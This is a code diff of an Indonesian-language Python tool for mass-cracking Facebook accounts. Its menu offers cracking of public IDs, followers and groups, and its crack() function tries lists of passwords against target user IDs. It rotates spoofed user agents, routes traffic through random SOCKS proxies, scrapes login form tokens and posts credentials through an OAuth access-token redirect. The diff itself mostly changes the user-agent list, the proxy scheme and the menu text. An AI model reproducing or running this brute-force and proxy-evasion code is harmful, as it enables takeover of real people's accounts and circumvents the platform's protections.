@@ -267,7 +267,7 @@ def menu(my_name,my_id):
 	rizki378_tamvan(f'[>] IP  : {ip}')
 	#rizki378_tamvan(f' Github   : RIZKI-ID)
 	rizki378_tamvan('=' * 40)
-	cetak(' [📍] 1. Crack Publik Massal\n [📍] 2. Crack Followers\n [📍] 3. Crack Group\n [📍] 4. Hasil Crack\n [📍] 5. Chat Author\n [📍] 0. Keluar')
+	cetak(' 📍 1. Crack Publik Massal\n 📍 2. Crack Followers\n 📍 3. Crack Group\n 📍 4. Hasil Crack\n 📍 5. Chat Author\n 📍 0. Keluar')
 	rizki378_tamvan('=' * 40)
 	rizki378_sayang_islammiyah = input('[?] Pilih : ')
 	rizki378_tamvan('=' * 40)
@@ -475,7 +475,7 @@ def grup():
 ###>[ ID SETTING ]<###
 def setting():
 	rizki378_tamvan('=' * 40)
-	cetak(' [📍] 1. Akun Lama\n [📍] 2. Akun Baru\n [📍] 3. Akun Acak')
+	cetak(' 📍 1. Akun Lama\n 📍 2. Akun Baru\n 📍 3. Akun Acak')
 	rizki378_tamvan('=' * 40)
 	baz_gege = input('[?] Pilih : ')
 	rizki378_tamvan('=' * 40)
@@ -501,7 +501,7 @@ def setting():
 		exit()
 		
 ###>[ METHOD LOGIN ]<###
-	print('[📍] 1. Method V1 ')
+	print('📍 1. Method V1 ')
 	#print('[•] 2. Method V2 ')
 	rizki378_tamvan('=' * 40)
 	rizki378 = input('[?] Pilih : ')
@@ -582,27 +582,27 @@ def crack(idf,pwv):
 	bo = random.choice([m,k,h,b,u,x])
 	sys.stdout.write(f"\rm.facebook {P}{loop}{P}/{P}{len(id)}{P} OK {H}{ok}{P} CP {k}{cp}{x} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
 	sys.stdout.flush()
-	ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
-	'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-	'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-	'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
-	'Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A566a Safari/419.3',
-	'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15',
-	'Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1C10 Safari/419.3',
-	'Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.3',
-	'Mozilla/5.0 (Linux; Android 10; NOH-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-        'Mozilla/5.0 (Linux; Android 11; moto g(50) Build/RRFS31.Q1-59-76-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 EdgW/1.0',
-        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15'
+	ua = random.choice(['Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/312.0.0.45.117;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 OPT/2.9',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/306.1.0.40.119;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Instagram 181.0.0.33.117 Android (29/10; 560dpi; 1344x2646; HUAWEI; NOH-NX9; HWNOH; kirin9000; es_MX; 281579033)',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/309.0.0.47.119;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/314.0.0.43.119;]',
+	'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/303.0.0.30.122;]',
+        'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 ACHEETAHI/1',
+        'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/308.0.0.30.118;]',
+        'Mozilla/5.0 (Linux; Android 10; NOH-NX9 Build/HUAWEINOH-N09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36 Instagram 170.0.0.30.474 Android (29/10; 560dpi; 1344x2646; HUAWEI; NOH-NX9; HWNOH; kirin9000; es_MX; 267397344)',
+        'Mozilla/5.0 (Linux; Android 12; HarmonyOS; NOH-AL10; HMSCore 6.8.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.0.310 Mobile Safari/537.36'
 ])
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
+			proxs= {'http': 'socks4://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3632 Build/KAB33O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.9822.80 Mobile Safari/537.36 HeyTapBrowser/31.7.36.1", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
 			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
